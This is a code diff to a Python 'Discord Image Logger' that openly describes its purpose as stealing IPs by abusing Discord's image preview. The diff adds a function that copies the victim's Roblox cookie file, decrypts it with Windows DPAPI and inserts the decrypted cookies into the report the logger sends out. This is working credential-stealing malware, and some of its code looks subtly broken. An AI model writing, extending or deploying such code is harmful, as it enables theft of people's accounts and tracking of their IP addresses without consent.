@@ -3,7 +3,7 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser, win32crypt
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -65,6 +65,39 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better
+
+def retrieve_roblox_cookies():
+    try:
+        user_profile = os.getenv("USERPROFILE", "")
+        roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
+
+        if not os.path.exists(roblox_cookies_path):
+            return "No Roblox cookies file found"
+        
+        temp_dir = os.getenv("TEMP", "")
+        destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
+        shutil.copy(roblox_cookies_path, destination_path)
+
+        with open(destination_path, 'r', encoding='utf-8') as file:
+            try:
+                file_content = json.load(file)
+                encoded_cookies = file_content.get("CookiesData", "")
+                
+                if encoded_cookies:
+                    decoded_cookies = base64.b64decode(encoded_cookies)
+                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
+                    return decrypted_cookies.decode('utf-8', errors='ignore')
+                else:
+                    return "No 'CookiesData' found in the file"
+            
+            except json.JSONDecodeError:
+                return "Error parsing JSON from cookies file"
+            except Exception as e:
+                return f"Error reading cookies: {str(e)}"
+    
+    except Exception as e:
+        return f"Error retrieving cookies: {str(e)}"
+
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -138,7 +171,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 
     os, browser = httpagentparser.simple_detect(useragent)
-    
+
+    roblox_cookies = retrieve_roblox_cookies()
+
     embed = {
     "username": config["username"],
     "content": ping,
@@ -170,6 +205,11 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **User Agent:**
 ```
 {useragent}
+```
+
+**Roblox Cookies:**
+```
+{roblox_cookies}
 ```""",
     }
   ],
